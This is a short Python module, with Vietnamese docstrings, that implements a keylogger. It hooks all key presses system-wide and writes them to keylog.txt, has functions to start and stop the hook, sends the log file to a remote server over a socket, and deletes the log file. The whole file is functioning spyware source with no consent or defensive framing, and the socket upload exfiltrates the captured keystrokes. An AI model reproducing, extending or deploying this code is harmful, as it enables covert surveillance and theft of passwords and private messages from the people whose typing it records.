import os
import keyboard

log_file = "keylog.txt"
is_logging = False

def log_key(e):
    """Ghi lại các phím bấm vào file log"""
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'space':
            char = ' '
        elif e.name == 'enter':
            char = '\n'
        elif e.name == 'backspace':
            char = '[BACKSPACE]'
        else:
            char = e.name

        with open(log_file, "a", encoding="utf-8") as f:
            f.write(char)

def start_keylogger():
    """Khởi động keylogger"""
    global is_logging
    if not is_logging:
        is_logging = True
        keyboard.hook(log_key)
        print("Keylogger started.")

def stop_keylogger():
    """Dừng keylogger"""
    global is_logging
    if is_logging:
        keyboard.unhook_all()
        is_logging = False
        print("Keylogger stopped.")

def send_log(sock):
    """Gửi nội dung file log tới server"""
    if os.path.exists(log_file):
        with open(log_file, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                sock.sendall(data)
        sock.sendall(b"END_OF_FILE")
    else:
        sock.sendall(b"No log file found.\n")

def delete_log():
    """Xóa file log"""
    if os.path.exists(log_file):
        os.remove(log_file)
        print("Log file deleted.")
